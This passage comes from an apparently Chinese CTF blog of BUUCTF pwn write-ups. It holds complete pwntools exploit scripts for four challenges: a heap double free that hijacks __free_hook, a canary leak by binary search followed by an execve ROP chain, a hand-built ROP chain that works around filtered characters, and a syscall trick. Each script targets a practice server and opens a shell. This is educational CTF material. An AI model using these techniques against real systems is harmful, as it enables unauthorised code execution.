class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_es_1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,name,phone):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Please input the size of compary's name")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("please input name:")</span><br><span class="line">sh.send(name)</span><br><span class="line">sh.recvuntil("please input compary call:")</span><br><span class="line">sh.send(phone)</span><br><span class="line">def show(idx):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("Please input the index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil("choice:")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil("Please input the index:")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_es_1")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">add(0xF0,'a' * 0x80,'\x00' * 0x4 + p64(0x61)) #idx 0</span><br><span class="line">add(0x58,'b' * 0x58,'\x00' * 0x4 + p64(0x61)) #idx 1</span><br><span class="line">add(0x58,'c' * 0x58,'\x00' * 0x4 + p64(0x61)) #idx 2</span><br><span class="line">add(0x68,'d' * 0x68,'\x00' * 4 + p64(0x61))   #idx 3</span><br><span class="line">add(0x68,'e' * 0x68,'\x00' * 4 + p64(0x61))   #idx 4</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">show(0)</span><br><span class="line">main_arena = u64(sh.recvuntil("\x7f",False)[-6:].ljust(8,'\x00')) - 88</span><br><span class="line">libc = main_arena - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">__free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">free(1)</span><br><span class="line">free(3)</span><br><span class="line">free(4)</span><br><span class="line">free(3)</span><br><span class="line">show(2)</span><br><span class="line">heap_base = u64(sh.recvuntil("\x0a\x70\x68",True)[-6:].ljust(8,'\x00'))</span><br><span class="line">heap_base = (heap_base >> 12) << 12</span><br><span class="line">add(0x58,p64(heap_base + 0xD8),'\x00' * 4 + p64(0x61)) #idx 5</span><br><span class="line">add(0x58,"/bin/sh\x00",'\x00' * 4 + p64(0x61)) #idx 6</span><br><span class="line">add(0x58,p64(heap_base + 0xD8),'\x00' * 4 + p64(0x61)) #idx 7</span><br><span class="line">for i in range(0,3):</span><br><span class="line">add(0x68,p64(__free_hook - 0x43),'\x00' * 4 + p64(0x61)) #idx 8-10</span><br><span class="line">payload  = p64(0x21) + p64(heap_base + 0xe8) + p64(0x58) + p64(0) + p64(0x21)</span><br><span class="line">payload += p64(main_arena + 88) + p64(__free_hook - 0x40 - 0x10)</span><br><span class="line">add(0x58,payload,'\x00' * 4 + p64(0x61))#idx 11</span><br><span class="line">payload = '\x00' * 3 + p64(0) * 6 + p64(system)</span><br><span class="line">add(0x68,payload,'\x00' * 4 + p64(0x61)) #idx 12</span><br><span class="line">free(6)</span><br><span class="line">log.success("main_arena: " + hex(main_arena))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("heap_base: " + hex(heap_base))</span><br><span class="line">log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">log.success("fastbin attack: " + hex(__free_hook - 0x40 + 0x7))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("f.buuoj.cn",20173,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x35-ciscn-2019-sw-6"><a href="#0x35-ciscn-2019-sw-6" class="headerlink" title="0x35 ciscn_2019_sw_6"></a>0x35 ciscn_2019_sw_6</h2><h3 id="简单看一下程序的功能，发现是归并排序，然后会输出逆序数"><a href="#简单看一下程序的功能，发现是归并排序，然后会输出逆序数" class="headerlink" title="简单看一下程序的功能，发现是归并排序，然后会输出逆序数"></a>简单看一下程序的功能，发现是归并排序，然后会输出逆序数</h3><h3 id="漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak-canary"><a href="#漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak-canary" class="headerlink" title="漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak canary"></a>漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak canary</h3><h3 id="考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击"><a href="#考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击" class="headerlink" title="考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击"></a>考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击</h3><h3 id="1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间"><a href="#1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间" class="headerlink" title="1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间"></a>1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间</h3><h3 id="2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为-0xFFFFFFFF-0x10000000-299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级"><a href="#2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为-0xFFFFFFFF-0x10000000-299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级" class="headerlink" title="2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为(0xFFFFFFFF - 0x10000000) / 299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级"></a>2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为(0xFFFFFFFF - 0x10000000) / 299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级</h3><h3 id="3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了"><a href="#3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了" class="headerlink" title="3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了"></a>3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了</h3><h3 id="4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell"><a href="#4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell" class="headerlink" title="4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell"></a>4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell</h3><h3 id="但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200-，且50-的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200-次，哈哈哈，没事本地拿到shell就好了，说明思路没有错"><a href="#但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200-，且50-的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200-次，哈哈哈，没事本地拿到shell就好了，说明思路没有错" class="headerlink" title="但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200+，且50%的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200+次，哈哈哈，没事本地拿到shell就好了，说明思路没有错"></a>但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200+，且50%的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200+次，哈哈哈，没事本地拿到shell就好了，说明思路没有错</h3><h3 id="这里介绍一个jly大师傅的解法，scanf-“-ud”-，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅"><a href="#这里介绍一个jly大师傅的解法，scanf-“-ud”-，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅" class="headerlink" title="这里介绍一个jly大师傅的解法，scanf(“%ud”)，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅"></a>这里介绍一个jly大师傅的解法，scanf(“%ud”)，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_sw_6")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">canary_list = []</span><br><span class="line">def getRop():</span><br><span class="line">rop = []</span><br><span class="line">rop.append(0x080704fa) # pop edx ; ret</span><br><span class="line">rop.append(0x080ec060) # @ .data</span><br><span class="line">rop.append(0x080b9856) # pop eax ; ret</span><br><span class="line">rop.append(0x6E69622F)</span><br><span class="line">rop.append(0x08055efb) # mov dword ptr [edx], eax ; ret</span><br><span class="line">rop.append(0x080704fa) # pop edx ; ret</span><br><span class="line">rop.append(0x080ec064) # @ .data + 4</span><br><span class="line">rop.append(0x080b9856) # pop eax ; ret</span><br><span class="line">rop.append(0x68732F2F)</span><br><span class="line">rop.append(0x08055efb) # mov dword ptr [edx], eax ; ret</span><br><span class="line">rop.append(0x080704fa) # pop edx ; ret</span><br><span class="line">rop.append(0x080ec068) # @ .data + 8</span><br><span class="line">rop.append(0x0804a773) # xor eax, eax ; ret</span><br><span class="line">rop.append(0x08055efb) # mov dword ptr [edx], eax ; ret</span><br><span class="line">rop.append(0x08049021) # pop ebx ; ret</span><br><span class="line">rop.append(0x080ec060) # @ .data</span><br><span class="line">rop.append(0x08070521) # pop ecx ; pop ebx ; ret</span><br><span class="line">rop.append(0x080ec068) # @ .data + 8</span><br><span class="line">rop.append(0x080ec060) # padding without overwrite ebx</span><br><span class="line">rop.append(0x080704fa) # pop edx ; ret</span><br><span class="line">rop.append(0x080ec068) # @ .data + 8</span><br><span class="line">rop.append(0x0804a773) # xor eax, eax ; ret</span><br><span class="line">rop.append(0x08096a87) # add eax,2 ; ret</span><br><span class="line">rop.append(0x08096aa0) # add eax,3 ; ret</span><br><span class="line">rop.append(0x08096aa0) # add eax,3 ; ret</span><br><span class="line">rop.append(0x08096aa0) # add eax,3 ; ret</span><br><span class="line">rop.append(0x0806e173) # int 0x80</span><br><span class="line">return rop</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_sw_6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">sh.recvuntil("Name:")</span><br><span class="line">sh.sendline("fuckyou")</span><br><span class="line">#leak 1</span><br><span class="line">sh.recvuntil("Count?(Input 0 to stop)")</span><br><span class="line">sh.sendline("301")</span><br><span class="line">num = 0x10000000</span><br><span class="line">for i in range(0,299):</span><br><span class="line">sh.recvuntil(": ")</span><br><span class="line">sh.sendline(str(num))</span><br><span class="line">canary_list.append(num)</span><br><span class="line">num = num + 0xCD7C24</span><br><span class="line">sh.recvuntil(": ")</span><br><span class="line">sh.sendline(str(0x0))</span><br><span class="line">sh.recvuntil("The result is ")</span><br><span class="line">magic1 = int(sh.recvuntil("\n",False),10) - 299</span><br><span class="line">canary_min_1 = (299 - magic1 - 1) * 0xCD7C24 + 0x10000000</span><br><span class="line">canary_max_1 = (299 - magic1) * 0xCD7C24 + 0x10000000</span><br><span class="line">sh.recvuntil("Continue?(y/n)")</span><br><span class="line">sh.sendline("y")</span><br><span class="line">#leak 2</span><br><span class="line">delta2 = (canary_max_1 - canary_min_1) / 299</span><br><span class="line">num = canary_min_1</span><br><span class="line">sh.recvuntil("Count?(Input 0 to stop)")</span><br><span class="line">sh.sendline("301")</span><br><span class="line">for i in range(0,299):</span><br><span class="line">sh.recvuntil(": ")</span><br><span class="line">sh.sendline(str(num))</span><br><span class="line">num = delta2 + num</span><br><span class="line">sh.recvuntil(": ")</span><br><span class="line">sh.sendline(str(0x0))</span><br><span class="line">sh.recvuntil("The result is ")</span><br><span class="line">magic2 = int(sh.recvuntil("\n",False),10) - 299</span><br><span class="line">canary_min_2 = (299 - magic2 - 1) * delta2 + canary_min_1</span><br><span class="line">canary_max_2 = (299 - magic2) * delta2 + canary_min_1</span><br><span class="line">sh.recvuntil("Continue?(y/n)")</span><br><span class="line">sh.sendline("y")</span><br><span class="line">#leak 3</span><br><span class="line">delta3 = (canary_max_2 - canary_min_2) / 299</span><br><span class="line">num = canary_min_2</span><br><span class="line">sh.recvuntil("Count?(Input 0 to stop)")</span><br><span class="line">sh.sendline("301")</span><br><span class="line">for i in range(0,299):</span><br><span class="line">sh.recvuntil(": ")</span><br><span class="line">sh.sendline(str(num))</span><br><span class="line">num = delta3 + num</span><br><span class="line">sh.recvuntil(": ")</span><br><span class="line">sh.sendline(str(0x0))</span><br><span class="line">sh.recvuntil("The result is ")</span><br><span class="line">magic3 = int(sh.recvuntil("\n",False),10) - 299</span><br><span class="line">canary_min_3 = (299 - magic3 - 1) * delta3 + canary_min_2</span><br><span class="line">canary_max_3 = (299 - magic3) * delta3 + canary_min_2</span><br><span class="line">sh.recvuntil("Continue?(y/n)")</span><br><span class="line">sh.sendline("y")</span><br><span class="line">canary = (canary_max_3 >> 8) << 8</span><br><span class="line">sh.recvuntil("Count?(Input 0 to stop)")</span><br><span class="line">sh.sendline("301")</span><br><span class="line">ROP = getRop()</span><br><span class="line">for i in range(0,300):</span><br><span class="line">sh.recvuntil(": ")</span><br><span class="line">sh.sendline(str(0xdeadbeef))</span><br><span class="line">sh.recvuntil(": ")</span><br><span class="line">sh.sendline(str(canary))</span><br><span class="line">sh.recvuntil(": ")</span><br><span class="line">sh.sendline(str(0xdeadbeef))</span><br><span class="line">for i in ROP:</span><br><span class="line">sh.recvuntil(": ")</span><br><span class="line">sh.sendline(str(i))</span><br><span class="line">sh.recvuntil(": ")</span><br><span class="line">sh.sendline("0")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("f.buuoj.cn",20133,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x36-ping-gnop-hackover-2016"><a href="#0x36-ping-gnop-hackover-2016" class="headerlink" title="0x36 ping_gnop_hackover_2016"></a>0x36 ping_gnop_hackover_2016</h2><h3 id="我将这题称为ROPgadget-–ropchain人工版"><a href="#我将这题称为ROPgadget-–ropchain人工版" class="headerlink" title="我将这题称为ROPgadget –ropchain人工版"></a>我将这题称为ROPgadget –ropchain人工版</h3><h3 id="题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过int-0x80拿到shell"><a href="#题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过int-0x80拿到shell" class="headerlink" title="题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过int 0x80拿到shell"></a>题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过<code>int 0x80</code>拿到shell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("ping_gnop_hackover_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ping_gnop_hackover_2016")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">pop_ebx_ret = 0x08050C5E</span><br><span class="line">pop_ecx_ret = 0x080e05f5</span><br><span class="line">pop_eax_ret = 0x080b9b26</span><br><span class="line">pop_edx_ret = 0x0806fe6a</span><br><span class="line">pop_esi_ret = 0x08049a34</span><br><span class="line">xor_eax_eax_ret = 0x08049573</span><br><span class="line">push_eax_ret = 0x080b9ac6</span><br><span class="line">int_0x80 = 0x0806d9c5</span><br><span class="line">xchg_eax_edx_ret = 0x0806cf29</span><br><span class="line">add_eax_3_ret = 0x08096be0</span><br><span class="line">add_eax_2_ret = 0x08096bc7</span><br><span class="line">add_eax_1_ret = 0x0807b576</span><br><span class="line">add_al_a_ret = 0x080e4dc2</span><br><span class="line">mov_eax_a_ret = 0x080e4dc2</span><br><span class="line">mov_eax_ecx_ret = 0x08070408</span><br><span class="line">pop_ecx_ebx_ret = 0x0806fe91</span><br><span class="line">mov_eax_ecx_pop_3_ret = 0x080498B6</span><br><span class="line">mov_ptr_edx_eax_ret = 0x0805596b</span><br><span class="line">add_al_89 = 0x08056e76</span><br><span class="line">sub_al_83 = 0x08077c0f</span><br><span class="line">dec_eax = 0x08064a93</span><br><span class="line">offset = 37</span><br><span class="line">payload = 'a' * offset</span><br><span class="line">payload += p32(0x1337CAFE)</span><br><span class="line">payload += 'aaaabaaacaaadaaaeaaafaaa'</span><br><span class="line">payload += p32(pop_edx_ret)</span><br><span class="line">payload += p32(0x080ED584)</span><br><span class="line">payload += p32(pop_ecx_ret)</span><br><span class="line">payload += "/bin"</span><br><span class="line">payload += p32(mov_eax_ecx_pop_3_ret)</span><br><span class="line">payload += p32(0xdeadbeef) * 3</span><br><span class="line">payload += p32(mov_ptr_edx_eax_ret)</span><br><span class="line">payload += p32(pop_edx_ret)</span><br><span class="line">payload += p32(0x080ED588)</span><br><span class="line">payload += p32(pop_ecx_ret)</span><br><span class="line">payload += "//sh"</span><br><span class="line">payload += p32(mov_eax_ecx_pop_3_ret)</span><br><span class="line">payload += p32(0xdeadbeef) * 3</span><br><span class="line">payload += p32(mov_ptr_edx_eax_ret)</span><br><span class="line">payload += p32(pop_ecx_ebx_ret)</span><br><span class="line">payload += p32(0x080ed594)</span><br><span class="line">payload += p32(0x080ed584)</span><br><span class="line">payload += p32(xor_eax_eax_ret)</span><br><span class="line">payload += p32(xchg_eax_edx_ret)</span><br><span class="line">payload += p32(xor_eax_eax_ret)</span><br><span class="line">payload += p32(add_al_a_ret)</span><br><span class="line">payload += p32(add_al_a_ret)</span><br><span class="line">for i in range(0,9):</span><br><span class="line">payload += p32(dec_eax)</span><br><span class="line">payload += p32(int_0x80)</span><br><span class="line">sh.sendline(payload[::-1])</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("f.buuoj.cn",20045,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x37-warmup"><a href="#0x37-warmup" class="headerlink" title="0x37 warmup"></a>0x37 warmup</h2><h3 id="这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell"><a href="#这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell" class="headerlink" title="这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell"></a>这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("warmup")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./warmup")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">write_addr = 0x08048135</span><br><span class="line">read_addr  = 0x0804811D</span><br><span class="line">execve_addr = 0x08048122</span><br><span class="line">offset = 32</span><br><span class="line">payload  = offset * "a"</span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(0x080480D8)</span><br><span class="line">payload += p32(0)</span><br><span class="line">payload += p32(0x80491bc)</span><br><span class="line">payload += p32(0x80491bc)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send("/bin/sh" + '\x00'*4)</span><br><span class="line">sleep(0.2)</span><br><span class="line">offset = 32</span><br><span class="line">payload  = offset * "a"</span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(0x08048122)</span><br><span class="line">payload += p32(0)</span><br><span class="line">payload += p32(0x80491bc)</span><br><span class="line">payload += p32(0x804920c) </span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send("/bin/sh" + '\x00'*4)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("f.buuoj.cn",20000,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 